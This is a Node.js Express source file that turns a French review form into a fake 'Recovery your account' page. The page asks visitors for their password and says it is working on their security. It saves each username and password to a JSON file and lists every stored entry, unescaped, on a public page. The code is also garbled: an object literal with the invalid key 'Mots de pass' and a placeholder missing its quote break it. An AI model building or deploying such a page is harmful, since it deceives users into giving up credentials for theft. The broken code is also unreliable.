import express from 'express';
import * as fs from 'fs';
const app = express();
const PORT = process.env.PORT || 3000;
const FILE_PATH = 'avis.json';

app.use(express.urlencoded({ extended: true }));

// Fonction pour lire les avis existants dans le fichier
function chargerAvis() {
    try {
        if (fs.existsSync(FILE_PATH)) {
            const data = fs.readFileSync(FILE_PATH, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error("Erreur de lecture du fichier :", error);
    }
    return [];
}

// Fonction pour sauvegarder la liste dans le fichier
function sauvegarderAvis(liste) {
    try {
        fs.writeFileSync(FILE_PATH, JSON.stringify(liste, null, 2), 'utf8');
    } catch (error) {
        console.error("Erreur d'écriture du fichier :", error);
    }
}

// Page d'accueil : Formulaire
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Donnez votre avis</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 50px; background-color: #f4f4f4; }
                .form-container { background: white; padding: 20px; border-radius: 8px; max-width: 400px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                .form-group { margin-bottom: 15px; }
                label { display: block; margin-bottom: 5px; font-weight: bold; }
                input, textarea { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
                button { background-color: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background-color: #218838; }
            </style>
        </head>
        <body>
            <div class="form-container">
                <h2>Recovery your account</h2>
                <form action="/envoyer-avis" method="POST">
                    <div class="form-group">
                        <label for="username">Nom d'utilisateur :</label>
                        <input type="text" id="username" name="username" required placeholder="Votre pseudo">
                    </div>
                    <div class="form-group">
                        <label for="avis">Votre avis :</label>
                        <textarea id="avis" name="avis" rows="4" required placeholder=Insert votre mots de passe"></textarea>
                    </div>
                    <button type="submit">Envoyer la reponse ici</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// Traitement du formulaire
app.post('/envoyer-avis', (req, res) => {
    const { username, avis } = req.body;
    
    // Charge la liste actuelle, ajoute le nouvel avis et sauvegarde
    let listeActuelle = chargerAvis();
    listeActuelle.push({ username, Mots de pass, date: new Date().toLocaleString() });
    sauvegarderAvis(listeActuelle);
    
    res.send('<h1>Merci !Nous travailon a votre securite.</h1><a href="/voir-avis">Voir les avis reçus</a>');
});

// Consultation des avis
app.get('/voir-avis', (req, res) => {
    const listeActuelle = chargerAvis();
    let html = '<h1>Liste des avis reçus :</h1><ul>';
    listeActuelle.forEach(item => {
        html += `<li><strong>${item.username}</strong> (${item.date}) : ${item.avis}</li>`;
    });
    html += '</ul><br><a href="/">Retour au formulaire</a>';
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});

